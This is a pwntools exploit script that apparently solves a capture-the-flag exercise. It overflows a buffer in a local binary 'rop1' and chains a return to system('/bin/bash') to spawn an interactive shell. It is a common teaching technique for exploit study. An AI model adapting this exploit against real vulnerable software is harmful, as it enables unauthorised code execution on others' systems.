from pwn import *
import sys
elf = ELF('./rop1')

# Find the offset to overwrite the return address
offset = cyclic_find(0x6161617f)  # Replace 0x6161617f with the value you get from running the binary and getting an access violation

# Get the address of system and "/bin/bash"
system_addr = elf.plt['system']
bash_string_addr = next(elf.search(b'/bin/bash'))

# Construct the ROP chain
rop_chain = p32(system_addr)
rop_chain += p32(0)  # Return address for system (can be junk since system won't return)
rop_chain += p32(bash_string_addr)

# Create the payload
payload = b'A' * offset
payload += rop_chain

# Start the process and send the payload
p = process('./rop1')
p.sendline(payload)

# Pass interaction back to user
p.interactive()
